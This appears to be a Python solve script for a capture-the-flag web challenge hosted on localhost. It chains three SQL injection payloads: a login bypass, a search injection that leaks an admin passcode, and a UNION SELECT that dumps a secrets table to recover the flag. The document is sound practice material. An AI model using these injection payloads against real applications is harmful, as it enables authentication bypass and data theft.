import requests

url = "http://localhost:5000"  

username_payload = "' is not null /*"                                                   # Stage 1
password = "whatever"                                            

search_payload = "Kiwi' and department='Management' /*"                                 # Stage 2

admin_payload = "' union select 1,secrets,'x','x' from CITADEL_ARCHIVE_2077/*"          # Stage 3

session = requests.Session()

r = session.post(
    url + "/",
    data={
        "username": username_payload,
        "password": password,
    },
)

r = session.post(
    url + "/search",
    data={
        "term": search_payload,
        "passcode": "",
    },
)

html = r.text

marker = "Passcode:"
idx = html.find(marker)

tail = html[idx + len(marker):]
tail = tail.lstrip()

admin_passcode = ""
for ch in tail:
    if ch == "<" or ch.isspace():
        break
    admin_passcode += ch

r = session.post(
    url + "/admin-login",
    data={"passcode": admin_passcode},
)

r = session.post(
    url + "/admin",
    data={"query": admin_payload},
)

html = r.text

prefix = "nite{"

start = html.find(prefix)
end = html.find("}",start)

flag = html[start:end + 1]

print(flag)




